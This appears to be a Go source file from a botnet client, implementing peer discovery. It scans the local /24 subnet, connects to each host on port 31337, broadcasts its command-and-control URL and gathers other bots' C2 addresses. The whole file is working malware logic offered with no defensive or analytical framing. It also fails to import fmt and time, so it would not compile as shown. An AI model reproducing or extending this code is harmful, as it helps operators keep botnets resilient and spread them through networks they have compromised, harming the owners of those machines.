// client/p2p.go
package main

import (
    "net"
    "sync"
)

type PeerDiscovery struct {
    peers     []string
    mu        sync.Mutex
    knownC2   []string
}

func (p *PeerDiscovery) BroadcastMyC2(myC2 string) {
    // Scan local network for other bots
    localIP := getLocalIP()
    subnet := localIP.Mask(net.CIDRMask(24, 32))
    
    for i := 1; i < 255; i++ {
        ip := fmt.Sprintf("%s.%d", subnet.String()[:len(subnet.String())-1], i)
        if ip == localIP.String() {
            continue
        }
        go p.sendToPeer(ip, myC2)
    }
}

func (p *PeerDiscovery) sendToPeer(targetIP, c2URL string) {
    conn, err := net.DialTimeout("tcp", targetIP+":31337", 2*time.Second)
    if err != nil {
        return
    }
    defer conn.Close()
    
    // Send C2 URL to peer bot
    conn.Write([]byte(c2URL))
    
    // Receive their known C2s
    buf := make([]byte, 1024)
    n, _ := conn.Read(buf)
    if n > 0 {
        p.mu.Lock()
        p.knownC2 = append(p.knownC2, string(buf[:n]))
        p.mu.Unlock()
    }
}
